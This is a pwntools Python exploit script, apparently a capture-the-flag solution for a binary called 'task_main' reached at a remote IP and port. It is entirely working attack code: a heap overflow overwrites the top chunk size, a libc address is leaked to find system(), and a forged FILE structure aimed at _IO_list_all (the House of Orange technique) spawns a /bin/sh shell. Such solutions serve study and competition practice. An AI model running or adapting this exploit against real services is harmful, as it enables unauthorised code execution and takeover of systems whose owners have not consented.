#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./task_main")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("117.78.37.77","32360")
    libc=ELF("./libc6_2.23-0ubuntu10_amd64.so")
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000CE6)
    b *(0x555555554000+0x000000000000e9e)
               ''')
#add,  
def menu(index):
    a.recvuntil("Choice >> \n")
    a.sendline(str(index))
def add(size,name):
    menu(1)
    a.recvuntil("The length of my owner's name:\n")
    a.sendline(str(size))
    a.recvuntil("Give me my owner's name:\n")
    a.send(name)
def show(index):
    menu(2)
    a.recvuntil("Please tell me which tickets would you want to open?\n")
    a.sendline(str(index))
def edit(index,size,name):
    menu(3)
    a.recvuntil("you want to change it's owner's name?\n")
    a.sendline(str(index))
    a.recvuntil("The length of my owner's name:\n")
    a.sendline(str(size))
    a.recvuntil("Give me my owner's name:")
    a.send(name)
add(0x18,'A')#0
edit(0,0x1000,'A'*0x18+p64(0xfc1))#top chunk size ==> 0xfc1
add(0x1000,'A')#1
add(0x100,'A')#2
edit(2,0x1000,'A'*8)
show(2)
a.recvuntil("A"*8)
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
system_addr=libc_base+libc.symbols["system"]
success("libc_base ==> 0x%x"%libc_base)
success("system_addr ==> 0x%x"%system_addr)
#edit(2,0x1000,'A'*16)
#show(2)
#a.recvuntil("A"*16)
#heap_base=u64(a.recv(6).ljust(8,'\x00'))-0x80
#success("heap_base ==> 0x%x"%heap_base)
io_list_all=libc_base+libc.symbols["_IO_list_all"]

payload=""
payload+=p64(0)+p64(0x61)
payload+=p64(0)+p64(io_list_all-0x10)
payload+=p64(1)+p64(2)
payload+=p64(0)+p64(libc_base+next(libc.search("/bin/sh")))
payload=payload.ljust(0xd8,'\x00')
payload+=p64(0x3c37a0+libc_base-8)
payload+=p64(0)
payload+=p64(system_addr)
edit(2,0x300,'A'*0x100+payload)
a.interactive()